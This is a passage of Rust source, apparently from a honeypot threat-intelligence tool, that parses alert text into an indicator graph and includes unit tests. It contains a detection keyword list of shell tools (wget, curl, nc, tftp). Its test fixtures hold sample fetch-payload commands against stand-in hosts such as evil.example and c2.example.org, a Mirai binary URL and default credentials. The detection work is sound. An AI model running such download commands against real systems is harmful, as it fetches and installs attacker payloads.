        && !value.eq_ignore_ascii_case("unknown")
        && !value.eq_ignore_ascii_case("n/a")
}

fn is_non_file_field_label(label: &str) -> bool {
    section_header_names()
        .iter()
        .any(|header| label.trim().eq_ignore_ascii_case(header))
        || [
            "Source IP",
            "Country / ASN",
            "Org",
            "Threat Score",
            "Protocols Hit",
            "Tools",
            "Attempts",
            "First Seen",
            "Last Seen",
            "URL",
            "Domain",
            "Hostname",
            "Reverse DNS",
        ]
        .iter()
        .any(|field| label.trim().eq_ignore_ascii_case(field))
}

fn is_hash_value(value: &str) -> bool {
    hash_re()
        .find(value)
        .is_some_and(|item| item.as_str() == value)
}

fn is_domain_value(value: &str) -> bool {
    domain_re()
        .find(value)
        .is_some_and(|item| item.as_str() == value)
}

fn domains_from_text(value: &str) -> Vec<String> {
    let mut seen = HashSet::new();
    domain_re()
        .find_iter(value)
        .map(|item| {
            item.as_str()
                .trim_matches(['.', ',', ';', ')', ']'])
                .to_ascii_lowercase()
        })
        .filter(|domain| seen.insert(domain.clone()))
        .collect()
}

fn is_likely_command(value: &str) -> bool {
    let value = value.trim();
    if !is_observed_value(value) || value.len() < 2 {
        return false;
    }

    let first = value
        .split_whitespace()
        .next()
        .unwrap_or("")
        .trim_start_matches(['/', '.']);
    let command = first.rsplit('/').next().unwrap_or(first);
    let known_command = [
        "bash", "sh", "busybox", "wget", "curl", "chmod", "chown", "cd", "cat", "echo", "uname",
        "export", "rm", "mkdir", "python", "python3", "perl", "tftp", "ftp", "scp", "nc", "netcat",
        "dd", "kill", "ps", "lscpu", "grep", "awk", "sed", "head", "tail",
    ]
    .iter()
    .any(|name| command == *name);

    known_command
        || value.contains(" && ")
        || value.contains(" || ")
        || value.contains("$(")
        || value.contains(" 2>/")
        || value.contains("; ")
}

fn record_text(record: &DashboardRecord) -> String {
    let mut parts = Vec::new();
    if let Some(description) = &record.description {
        parts.push(description.as_str());
    }
    if let Some(content) = record
        .raw
        .as_ref()
        .and_then(|raw| raw.get("content"))
        .and_then(Value::as_str)
    {
        parts.push(content);
    }
    parts.join("\n\n")
}

fn compact_record_metadata(record: &DashboardRecord, tags: &[String]) -> Value {
    let mut map = Map::new();
    insert_optional(&mut map, "dashboard_id", record.id.clone());
    insert_optional(&mut map, "region", record_region(record));
    insert_optional(&mut map, "campaign", record.campaign.clone());
    insert_optional(&mut map, "actor", record.actor.clone());
    insert_optional(&mut map, "enriched_at", record.enriched_at.clone());
    if let Some(count) = record.count {
        map.insert("count".to_string(), json!(count));
    }
    if !tags.is_empty() {
        map.insert("tags".to_string(), json!(tags));
    }
    if let Some(enrichment) = record.enrichment.as_ref().and_then(compact_enrichment) {
        map.insert("enrichment".to_string(), enrichment);
    }
    Value::Object(map)
}

fn source_metadata(region: Option<&str>) -> Value {
    let mut map = Map::new();
    map.insert("kind".to_string(), json!("dashboard_source"));
    insert_optional_str(&mut map, "region", region);
    Value::Object(map)
}

fn alert_metadata(external_id: &str, region: Option<&str>) -> Value {
    let mut map = Map::new();
    map.insert("external_id".to_string(), json!(external_id));
    insert_optional_str(&mut map, "region", region);
    Value::Object(map)
}

fn record_region(record: &DashboardRecord) -> Option<String> {
    record
        .region
        .as_deref()
        .and_then(string_value)
        .or_else(|| raw_string(record.raw.as_ref(), "region"))
        .or_else(|| raw_string(record.raw.as_ref(), "vmRegion"))
        .or_else(|| raw_string(record.raw.as_ref(), "vm_region"))
}

fn raw_string(raw: Option<&Value>, key: &str) -> Option<String> {
    raw?.get(key).and_then(Value::as_str).and_then(string_value)
}

fn string_value(value: &str) -> Option<String> {
    let value = value.trim();
    (!value.is_empty()).then(|| value.to_owned())
}

fn compact_enrichment(enrichment: &Value) -> Option<Value> {
    let providers = enrichment.get("providers")?.as_array()?;
    let providers: Vec<_> = providers
        .iter()
        .filter_map(|provider| {
            let name = provider.get("name").and_then(Value::as_str)?;
            Some(json!({
                "name": name,
                "ok": provider.get("ok").and_then(Value::as_bool),
                "score": provider.get("score").and_then(Value::as_str),
                "summary": provider.get("summary").and_then(Value::as_str),
            }))
        })
        .collect();

    (!providers.is_empty()).then(|| {
        json!({
            "ok": enrichment.get("ok").and_then(Value::as_bool),
            "enrichedAt": enrichment.get("enrichedAt").and_then(Value::as_str),
            "providers": providers,
        })
    })
}

fn insert_optional(map: &mut Map<String, Value>, key: &str, value: Option<String>) {
    if let Some(value) = value.filter(|value| !value.trim().is_empty()) {
        map.insert(key.to_string(), json!(value));
    }
}

fn insert_optional_str(map: &mut Map<String, Value>, key: &str, value: Option<&str>) {
    if let Some(value) = value.and_then(string_value) {
        map.insert(key.to_string(), json!(value));
    }
}

fn parse_datetime(value: Option<&str>) -> Option<DateTime<Utc>> {
    let value = value?.trim();
    if value.is_empty() {
        return None;
    }

    DateTime::parse_from_rfc3339(value)
        .map(|value| value.with_timezone(&Utc))
        .ok()
        .or_else(|| parse_datetime_format(value, "%Y-%m-%d %H:%M:%S UTC"))
        .or_else(|| parse_datetime_format(value, "%Y-%m-%d %H:%M UTC"))
}

fn parse_datetime_format(value: &str, format: &str) -> Option<DateTime<Utc>> {
    NaiveDateTime::parse_from_str(value, format)
        .ok()
        .map(|value| Utc.from_utc_datetime(&value))
}

fn parse_alert_datetime(text: &str, field: &str) -> Option<DateTime<Utc>> {
    parse_datetime(parse_field(text, field).as_deref())
}

fn normalize_severity(value: Option<&str>) -> Option<String> {
    let value = value?.trim().to_ascii_lowercase();
    let severity = if ["critical", "high", "medium", "low", "info"].contains(&value.as_str()) {
        value
    } else if value.contains("critical") || value.contains("urgent") {
        "critical".to_string()
    } else if value.contains("high") || value.contains("malicious") {
        "high".to_string()
    } else if value.contains("medium") || value.contains("suspicious") {
        "medium".to_string()
    } else if value.contains("low") {
        "low".to_string()
    } else {
        return None;
    };
    Some(severity)
}

fn severity_from_text(text: &str) -> Option<String> {
    for field in ["Severity", "Threat Score", "Risk", "Priority"] {
        if let Some(value) = parse_field(text, field) {
            if let Some(severity) = normalize_severity(Some(&value)) {
                return Some(severity);
            }
            if field == "Threat Score" {
                if let Some(score) = number_re()
                    .find(&value)
                    .and_then(|value| value.as_str().parse::<i32>().ok())
                {
                    return Some(
                        match score {
                            90..=100 => "critical",
                            70..=89 => "high",
                            40..=69 => "medium",
                            20..=39 => "low",
                            _ => "info",
                        }
                        .to_string(),
                    );
                }
            }
        }
    }
    None
}

fn parse_field(text: &str, field: &str) -> Option<String> {
    for line in text.lines() {
        let clean = strip_line_prefix(line);
        let Some((label, value)) = clean.split_once(':') else {
            continue;
        };
        if label.trim().eq_ignore_ascii_case(field) {
            let value = value.trim();
            if !value.is_empty() && !value.eq_ignore_ascii_case("unknown") {
                return Some(value.to_string());
            }
        }
    }
    None
}

fn strip_line_prefix(line: &str) -> String {
    line.trim()
        .trim_start_matches(|ch: char| {
            !(ch.is_ascii_alphanumeric() || ch == 'A' || ch == 'T' || ch == 'C')
        })
        .trim()
        .to_string()
}

fn parse_country_asn(text: &str) -> (Option<String>, Option<String>, Option<String>) {
    if let Some(combined) = parse_field(text, "Country / ASN") {
        let mut parts = combined.splitn(2, '/');
        let country = parts
            .next()
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToOwned::to_owned);
        let (asn, org) = parse_asn_org(parts.next().unwrap_or(""));
        return (country, asn, org);
    }

    let country = parse_field(text, "Country");
    let (asn, org) = parse_asn_org(parse_field(text, "ASN").as_deref().unwrap_or(""));
    (country, asn, org)
}

fn parse_asn_org(value: &str) -> (Option<String>, Option<String>) {
    let Some(captures) = asn_re().captures(value) else {
        let org = value.trim();
        return (
            None,
            (!org.is_empty() && !org.eq_ignore_ascii_case("unknown")).then(|| org.to_string()),
        );
    };

    let asn = captures
        .get(1)
        .map(|value| value.as_str().to_ascii_uppercase());
    let org = captures
        .get(2)
        .map(|value| value.as_str().trim().to_string())
        .filter(|value| !value.is_empty());
    (asn, org)
}

fn parse_mitre(text: &str) -> Vec<(String, String)> {
    let mut seen = HashSet::new();
    let mut values = Vec::new();
    for line in text.lines() {
        let clean = strip_bullet(line);
        let Some(captures) = mitre_re().captures(&clean) else {
            continue;
        };
        let code = captures.get(1).unwrap().as_str().to_ascii_uppercase();
        if !seen.insert(code.clone()) {
            continue;
        }
        let label = captures
            .get(2)
            .map(|value| value.as_str().trim_matches(['-', ':', ' ']).to_string())
            .unwrap_or_default();
        values.push((code, label));
    }
    values
}

fn parse_hashes(text: &str) -> Vec<String> {
    let mut seen = HashSet::new();
    hash_re()
        .find_iter(text)
        .map(|item| item.as_str().to_ascii_lowercase())
        .filter(|hash| seen.insert(hash.clone()))
        .collect()
}

fn parse_downloaded_files(text: &str) -> Vec<String> {
    let lines = parse_section(
        text,
        "Downloaded Files",
        &[
            "Credentials",
            "Commands",
            "SHA256",
            "URL",
            "MITRE ATT&CK",
            "Event Types",
            "Other Protocols Observed",
            "Source IP",
            "Country / ASN",
            "Org",
            "Threat Score",
            "Protocols Hit",
            "Tools",
            "Attempts",
            "First Seen",
            "Last Seen",
        ],
    );
    lines
        .into_iter()
        .filter_map(|line| normalize_downloaded_file(&line))
        .collect()
}

fn parse_commands(text: &str) -> Vec<String> {
    parse_section(
        text,
        "Commands",
        &[
            "Downloaded Files",
            "SHA256",
            "MITRE ATT&CK",
            "Event Types",
            "Credentials",
            "Source IP",
            "Country / ASN",
            "Org",
            "Threat Score",
            "Protocols Hit",
            "Tools",
            "Attempts",
            "First Seen",
            "Last Seen",
        ],
    )
    .into_iter()
    .filter(|line| is_likely_command(line))
    .collect()
}

fn parse_domains(text: &str) -> Vec<String> {
    let mut seen = HashSet::new();
    let mut domains = Vec::new();

    for field in [
        "Domain",
        "Hostname",
        "Reverse DNS",
        "Org",
        "Organization",
        "Provider",
    ] {
        if let Some(value) = parse_field(text, field) {
            for domain in domains_from_text(&value) {
                if seen.insert(domain.clone()) {
                    domains.push(domain);
                }
            }
        }
    }

    for url in url_re().find_iter(text).map(|item| item.as_str()) {
        if let Some(host) = host_from_url(url) {
            if seen.insert(host.clone()) {
                domains.push(host);
            }
        }
    }

    domains
}

fn parse_section(text: &str, header: &str, stop_headers: &[&str]) -> Vec<String> {
    let mut inside = false;
    let mut values = Vec::new();

    for line in text.lines() {
        let clean = strip_line_prefix(line);
        let label = clean.trim_end_matches(':').trim();
        if !inside && label.eq_ignore_ascii_case(header) {
            inside = true;
            continue;
        }

        if !inside {
            continue;
        }

        if stop_headers
            .iter()
            .any(|stop| label.eq_ignore_ascii_case(stop) || label.starts_with(stop))
        {
            break;
        }

        let item = strip_bullet(line);
        if !item.is_empty() && !is_separator(&item) {
            values.push(item);
        }
    }

    values
}

fn strip_bullet(line: &str) -> String {
    line.trim()
        .trim_start_matches(['-', '*', '•'])
        .trim()
        .to_string()
}

fn is_separator(value: &str) -> bool {
    value.chars().all(|ch| ch == '-' || ch == '_' || ch == ' ')
}

fn host_from_url(value: &str) -> Option<String> {
    let rest = value
        .strip_prefix("http://")
        .or_else(|| value.strip_prefix("https://"))?;
    let host = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or("")
        .rsplit('@')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    (host.contains('.') && !host.is_empty()).then_some(host)
}

fn malware_labels(enrichment: Option<&Value>) -> Vec<String> {
    let mut labels = HashSet::new();
    let Some(providers) = enrichment
        .and_then(|value| value.get("providers"))
        .and_then(Value::as_array)
    else {
        return Vec::new();
    };

    for provider in providers {
        let name = provider
            .get("name")
            .and_then(Value::as_str)
            .unwrap_or("provider");
        let summary = provider
            .get("summary")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_ascii_lowercase();
        let score = provider
            .get("score")
            .and_then(Value::as_str)
            .unwrap_or_default();
        let malicious_score = score
            .split('/')
            .next()
            .and_then(|value| value.trim().parse::<i32>().ok())
            .unwrap_or(0);

        if summary.contains("malicious") || malicious_score > 0 {
            labels.insert(format!("{name} malicious"));
        }
    }

    let mut labels: Vec<_> = labels.into_iter().collect();
    labels.sort();
    labels
}

fn tags_from_value(value: Option<&Value>) -> Vec<String> {
    match value {
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToOwned::to_owned)
            .collect(),
        Some(Value::String(value)) => value
            .split([',', ' '])
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToOwned::to_owned)
            .collect(),
        _ => Vec::new(),
    }
}

fn raw_id(record: &DashboardRecord) -> Option<String> {
    let raw = record.raw.as_ref()?;
    raw.get("id").and_then(value_to_string).or_else(|| {
        raw.get("discordMessage")?
            .get("id")
            .and_then(value_to_string)
    })
}

fn value_to_string(value: &Value) -> Option<String> {
    match value {
        Value::String(value) => Some(value.clone()),
        Value::Number(value) => Some(value.to_string()),
        _ => None,
    }
}

fn title_from_text(text: &str) -> Option<String> {
    text.lines()
        .map(str::trim)
        .find(|line| !line.is_empty() && !is_separator(line))
        .map(|line| truncate(line, 120))
}

fn merge_node(existing: &mut GraphNode, incoming: &GraphNode) {
    existing.first_seen = existing.first_seen.min(incoming.first_seen);
    existing.last_seen = existing.last_seen.max(incoming.last_seen);
    existing.severity =
        strongest_severity(existing.severity.as_deref(), incoming.severity.as_deref());
    if existing.source.is_none() {
        existing.source = incoming.source.clone();
    }
    if existing.description.is_none() {
        existing.description = incoming.description.clone();
    }
    merge_metadata(&mut existing.metadata, &incoming.metadata);
}

fn merge_alert(existing: &mut Alert, incoming: &Alert) {
    existing.first_seen = existing.first_seen.min(incoming.first_seen);
    existing.last_seen = existing.last_seen.max(incoming.last_seen);
    existing.severity =
        strongest_severity(existing.severity.as_deref(), incoming.severity.as_deref());
    existing.description = incoming
        .description
        .clone()
        .or_else(|| existing.description.clone());
    if incoming
        .raw
        .as_object()
        .is_none_or(|value| !value.is_empty())
    {
        existing.raw = incoming.raw.clone();
    }
}

fn merge_edge(existing: &mut GraphEdge, incoming: &GraphEdge) {
    existing.first_seen = existing.first_seen.min(incoming.first_seen);
    existing.last_seen = existing.last_seen.max(incoming.last_seen);
    if existing.alert_id.is_none() {
        existing.alert_id = incoming.alert_id;
    }
    let count = existing
        .metadata
        .get("count")
        .and_then(Value::as_u64)
        .unwrap_or(1)
        + incoming
            .metadata
            .get("count")
            .and_then(Value::as_u64)
            .unwrap_or(1);
    existing.metadata = json!({ "count": count });
}

fn merge_metadata(existing: &mut Value, incoming: &Value) {
    let (Some(existing), Some(incoming)) = (existing.as_object_mut(), incoming.as_object()) else {
        return;
    };
    for (key, value) in incoming {
        existing.insert(key.clone(), value.clone());
    }
}

fn strongest_severity(left: Option<&str>, right: Option<&str>) -> Option<String> {
    match (left, right) {
        (Some(left), Some(right)) => {
            if severity_rank(right) > severity_rank(left) {
                Some(right.to_string())
            } else {
                Some(left.to_string())
            }
        }
        (Some(value), None) | (None, Some(value)) => Some(value.to_string()),
        (None, None) => None,
    }
}

fn severity_rank(value: &str) -> i32 {
    match value {
        "critical" => 5,
        "high" => 4,
        "medium" => 3,
        "low" => 2,
        "info" => 1,
        _ => 0,
    }
}

fn stable_id(kind: &str, value: &str) -> Uuid {
    Uuid::new_v5(&NAMESPACE, format!("{kind}:{value}").as_bytes())
}

fn node_key(node_type: &str, value: &str) -> String {
    format!("{node_type}\u{1f}{value}")
}

fn clean_text(value: String) -> String {
    if value.contains('\0') {
        value.chars().filter(|ch| *ch != '\0').collect()
    } else {
        value
    }
}

fn sanitize_json_value(value: Value) -> Value {
    match value {
        Value::String(value) => Value::String(clean_text(value)),
        Value::Array(items) => Value::Array(items.into_iter().map(sanitize_json_value).collect()),
        Value::Object(map) => Value::Object(
            map.into_iter()
                .map(|(key, value)| (clean_text(key), sanitize_json_value(value)))
                .collect(),
        ),
        value => value,
    }
}

fn truncate(value: &str, limit: usize) -> String {
    let mut output = String::new();
    for ch in value.chars().filter(|ch| *ch != '\0').take(limit) {
        output.push(ch);
    }
    output
}

fn short_hash(value: &str) -> String {
    if value.len() <= 16 {
        value.to_string()
    } else {
        format!("{}...", &value[..16])
    }
}

fn section_header_names() -> &'static [&'static str] {
    &[
        "Credentials",
        "Commands",
        "Downloaded Files",
        "SHA256",
        "MITRE ATT&CK",
        "Event Types",
        "Other Protocols Observed",
    ]
}

fn number_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\d{1,3}").unwrap())
}

fn asn_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)\b(AS\d+)\b\s*(.*)").unwrap())
}

fn mitre_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)\b(T\d{4}(?:\.\d{3})?)\b\s*(.*)$").unwrap())
}

fn hash_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)\b(?:[a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{64})\b").unwrap())
}

fn domain_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}\b").unwrap()
    })
}

fn url_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"(?i)\bhttps?://[^\s<>"']+"#).unwrap())
}

fn email_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)^[a-z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+$").unwrap()
    })
}

fn cve_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)^CVE-\d{4}-\d{4,7}$").unwrap())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitizes_lone_surrogate_escape() {
        let input = r#"{"text":"abc \ud83d"}"#;
        let output = sanitize_lone_surrogate_escapes(input);
        let parsed: Value = serde_json::from_str(&output).unwrap();
        assert_eq!(parsed["text"], format!("abc {}", '\u{fffd}'));
    }

    #[test]
    fn keeps_valid_surrogate_pair() {
        let input = r#"{"text":"\ud83d\udea8"}"#;
        let output = sanitize_lone_surrogate_escapes(input);
        let parsed: Value = serde_json::from_str(&output).unwrap();
        assert_eq!(parsed["text"], "\u{1f6a8}");
    }

    #[test]
    fn sanitizes_nul_characters_before_database_insert() {
        let value = sanitize_json_value(json!({
            "content": "enable\0:linuxshell\0",
            "nested": ["root\0", { "bad\0key": "pass\0word" }]
        }));

        assert_eq!(value["content"], "enable:linuxshell");
        assert_eq!(value["nested"][0], "root");
        assert_eq!(value["nested"][1]["badkey"], "password");

        let observation = source_observation(
            "nul.json",
            &json!({ "id": "event-nul", "raw": { "content": "credential\0value" } }),
        )
        .expect("build source observation");
        assert_eq!(observation.payload["raw"]["content"], "credentialvalue");
        assert!(!observation.payload.to_string().contains("\\u0000"));

        let mut builder = SnapshotBuilder::default();
        builder.add_record(DashboardRecord {
            id: Some("event-nul".to_string()),
            ioc_type: Some("ip".to_string()),
            value: Some("1.2.3.4".to_string()),
            severity: Some("high".to_string()),
            source: Some("discord-channel:test".to_string()),
            region: Some("Test Region".to_string()),
            campaign: None,
            actor: None,
            tags: None,
            description: Some("Honeypot Alert\0\nSource IP: 1.2.3.4".to_string()),
            first_seen: Some("2026-07-05T01:00:00Z".to_string()),
            last_seen: Some("2026-07-05T01:05:00Z".to_string()),
            enriched_at: None,
            enrichment: None,
            count: None,
            raw: Some(json!({ "id": "alert-nul", "content": "credential\0value" })),
        });

        let snapshot = builder.finish();

        for node in snapshot.nodes {
            assert!(!node.value.contains('\0'));
            assert!(!node.label.contains('\0'));
            assert!(!node.description.unwrap_or_default().contains('\0'));
            assert!(!node.metadata.to_string().contains("\\u0000"));
        }

        for alert in snapshot.alerts {
            assert!(!alert.title.contains('\0'));
            assert!(!alert.description.unwrap_or_default().contains('\0'));
            assert!(!alert.raw.to_string().contains("\\u0000"));
        }
    }

    #[test]
    fn parses_country_asn_combined_field() {
        let text = "Country / ASN: Canada / AS16276 OVH SAS";
        let (country, asn, org) = parse_country_asn(text);
        assert_eq!(country.as_deref(), Some("Canada"));
        assert_eq!(asn.as_deref(), Some("AS16276"));
        assert_eq!(org.as_deref(), Some("OVH SAS"));
    }

    #[test]
    fn reuses_common_ip_asn_and_alert_entities() {
        let mut builder = SnapshotBuilder::default();
        let content = "Honeypot Correlated Alert - HIGH\n\nSource IP: 1.2.3.4\nCountry / ASN: Exampleland / AS13335 Example Net\nFirst Seen: 2026-07-05 01:00:00 UTC\nLast Seen: 2026-07-05 01:05:00 UTC\n\nSHA256\n- 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n\nMITRE ATT&CK\n- T1105 Command and Control - Ingress Tool Transfer";

        for value in ["domain1.example", "domain2.example"] {
            builder.add_record(DashboardRecord {
                id: Some(format!("event-{value}")),
                ioc_type: Some("domain".to_string()),
                value: Some(value.to_string()),
                severity: Some("high".to_string()),
                source: Some("discord-channel:test".to_string()),
                region: Some("Test Region".to_string()),
                campaign: None,
                actor: None,
                tags: None,
                description: Some(content.to_string()),
                first_seen: Some("2026-07-05T01:00:00Z".to_string()),
                last_seen: Some("2026-07-05T01:05:00Z".to_string()),
                enriched_at: None,
                enrichment: None,
                count: None,
                raw: Some(json!({ "id": "alert-1", "content": content })),
            });
        }

        let snapshot = builder.finish();
        assert_eq!(
            snapshot
                .nodes
                .iter()
                .filter(|node| node.node_type == "IP" && node.value == "1.2.3.4")
                .count(),
            1
        );
        assert_eq!(
            snapshot
                .nodes
                .iter()
                .filter(|node| node.node_type == "ASN" && node.value == "AS13335")
                .count(),
            1
        );
        assert_eq!(snapshot.alerts.len(), 1);
        assert_eq!(
            snapshot
                .edges
                .iter()
                .filter(|edge| edge.relation == "resolves_to")
                .count(),
            2
        );
    }

    #[test]
    fn downloaded_files_keep_only_download_targets() {
        let text = "Honeypot Correlated Alert - CRITICAL\n\nDownloaded Files\n- /tmp/payload.sh\n- http://evil.example/bin/mirai.x86\n- 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n\nCredentials\n- root:root";

        assert_eq!(
            parse_downloaded_files(text),
            vec!["/tmp/payload.sh".to_string(), "mirai.x86".to_string()]
        );
    }

    #[test]
    fn file_typed_values_are_reclassified_or_rejected() {
        assert_eq!(
            normalize_ioc("file", "Source IP: 91.92.40.171"),
            Some(("IP".to_string(), "91.92.40.171".to_string()))
        );
        assert_eq!(
            normalize_ioc(
                "file",
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
            ),
            Some((
                "Hash".to_string(),
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".to_string()
            ))
        );
        assert_eq!(
            normalize_ioc("file", "curl http://evil.example/payload.sh"),
            Some((
                "Command".to_string(),
                "curl http://evil.example/payload.sh".to_string()
            ))
        );
        assert_eq!(
            normalize_ioc("file", "evil.example"),
            Some(("Domain".to_string(), "evil.example".to_string()))
        );
        assert_eq!(
            normalize_ioc("file", "Threat Score: 100/100 (CRITICAL)"),
            None
        );
        assert_eq!(normalize_ioc("file", "gitlab:git"), None);
    }

    #[test]
    fn email_and_cve_values_are_normalized_conservatively() {
        assert_eq!(
            normalize_ioc("email", "Analyst@Example.COM"),
            Some(("Email".to_string(), "analyst@example.com".to_string()))
        );
        assert_eq!(
            normalize_ioc("cve", "cve-2026-12345"),
            Some(("CVE".to_string(), "CVE-2026-12345".to_string()))
        );
        assert_eq!(normalize_ioc("email", "not-an-email"), None);
        assert_eq!(normalize_ioc("cve", "CVE-26-1"), None);
    }

    #[test]
    fn commands_and_context_domains_are_added_to_snapshot() {
        let mut builder = SnapshotBuilder::default();
        let content = "Honeypot Correlated Alert - MEDIUM\n\nSource IP: 1.2.3.4\nHostname: c2.example.org\nCommands\n- wget http://c2.example.org/payload.sh -O /tmp/payload.sh\n\nDownloaded Files\n- /tmp/payload.sh\n\nFirst Seen: 2026-07-05 01:00:00 UTC\nLast Seen: 2026-07-05 01:05:00 UTC";

        builder.add_record(DashboardRecord {
            id: Some("event-command".to_string()),
            ioc_type: Some("ip".to_string()),
            value: Some("1.2.3.4".to_string()),
            severity: Some("medium".to_string()),
            source: Some("discord-channel:test".to_string()),
            region: Some("Test Region".to_string()),
            campaign: None,
            actor: None,
            tags: None,
            description: Some(content.to_string()),
            first_seen: Some("2026-07-05T01:00:00Z".to_string()),
            last_seen: Some("2026-07-05T01:05:00Z".to_string()),
            enriched_at: None,
            enrichment: None,
            count: None,
            raw: Some(json!({ "id": "alert-command", "content": content })),
        });

        let snapshot = builder.finish();
        assert_eq!(
            snapshot
                .nodes
                .iter()
                .filter(|node| {
                    node.node_type == "Command"
                        && node.value == "wget http://c2.example.org/payload.sh -O /tmp/payload.sh"
                })
                .count(),
            1
        );
        assert_eq!(
            snapshot
                .nodes
                .iter()
                .filter(|node| node.node_type == "Domain" && node.value == "c2.example.org")
                .count(),
            1
        );
        assert_eq!(
            snapshot
                .nodes
                .iter()
                .filter(|node| node.node_type == "File" && node.value == "/tmp/payload.sh")
                .count(),
            1
        );
        assert_eq!(
            snapshot
                .nodes
                .iter()
                .filter(|node| {
                    node.node_type == "File"
                        && (node.value.starts_with("Source IP")
                            || node.value.starts_with("Threat Score"))
                })
                .count(),
            0
        );
    }

    #[test]
    fn ip_context_extracts_domain_from_organization_fields() {
        let mut builder = SnapshotBuilder::default();
        let content = "Honeypot Correlated Alert - MEDIUM\n\nSource IP: 203.0.113.10\nOrg: VMHeaven.io Hosting\nFirst Seen: 2026-07-05 01:00:00 UTC\nLast Seen: 2026-07-05 01:05:00 UTC";

        builder.add_record(DashboardRecord {
            id: Some("event-org-domain".to_string()),
            ioc_type: Some("ip".to_string()),
            value: Some("203.0.113.10".to_string()),
            severity: Some("medium".to_string()),
            source: Some("discord-channel:test".to_string()),
            region: Some("Test Region".to_string()),
            campaign: None,
            actor: None,
            tags: None,
            description: Some(content.to_string()),
            first_seen: Some("2026-07-05T01:00:00Z".to_string()),
            last_seen: Some("2026-07-05T01:05:00Z".to_string()),
            enriched_at: None,
            enrichment: None,
            count: None,
            raw: Some(json!({ "id": "alert-org-domain", "content": content })),
        });

        let snapshot = builder.finish();
        let ip = snapshot
            .nodes
            .iter()
            .find(|node| node.node_type == "IP" && node.value == "203.0.113.10")
            .unwrap();
        let domain = snapshot
            .nodes
            .iter()
            .find(|node| node.node_type == "Domain" && node.value == "vmheaven.io")
            .unwrap();

        assert!(snapshot.edges.iter().any(|edge| {
            edge.source_node_id == domain.id
                && edge.target_node_id == ip.id
                && edge.relation == "resolves_to"
        }));
    }
}
